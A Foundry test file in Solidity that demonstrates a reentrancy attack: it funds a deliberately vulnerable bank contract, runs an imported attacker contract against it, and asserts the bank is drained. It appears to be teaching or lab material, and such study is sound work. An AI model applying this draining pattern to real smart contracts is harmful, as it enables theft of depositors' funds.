// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/targets/VulnerableBank.sol";
import "../src/attackers/ReentrancyAttacker.sol";

/// @title ReentrancyAttackTest
/// @author Charissa
/// @notice A Foundry test contract that demonstrates the reentrancy vulnerability in the VulnerableBank contract and how it can be exploited by the ReentrancyAttacker contract

contract ReentrancyAttackTest is Test {
    VulnerableBank public bank;
    ReentrancyAttacker public attacker;

    address public attackerWallet = address(0x1337);

    function setUp() public {
        // Deploy vulnerable bank
        bank = new VulnerableBank();

        // Fund the bank with several "innocent" depositors' money
        // so there's something worth stealing
        vm.deal(address(this), 10 ether);
        bank.deposit{value: 10 ether}();
        
        // Deploy the attacker contract, with the target being the bank
        attacker = new ReentrancyAttacker(address(bank));

        // Give our attacker wallet some starting ETH
        vm.deal(attackerWallet, 1 ether);
    }

    function testReentrancyDrainsBank() public {
        uint256 bankBalanceBefore = bank.getBalance();
        console.log("Bank balance before attack:", bankBalanceBefore);

        // Attacker launches the attack with 1 ETH
        vm.prank(attackerWallet);
        attacker.attack{value: 1 ether}();

        uint256 bankBalanceAfter = bank.getBalance();
        uint256 attackerBalanceAfter = attacker.getBalance();

        console.log("Bank balance after attack:", bankBalanceAfter);
        console.log("Attacker balance after attack:", attackerBalanceAfter);

        // The bank should be drained
        assertEq(bankBalanceAfter, 0);

        // The attacker should have stolen far more than the 1 ETH they have deposited
        assertGt(attackerBalanceAfter, 1 ether);
    }
}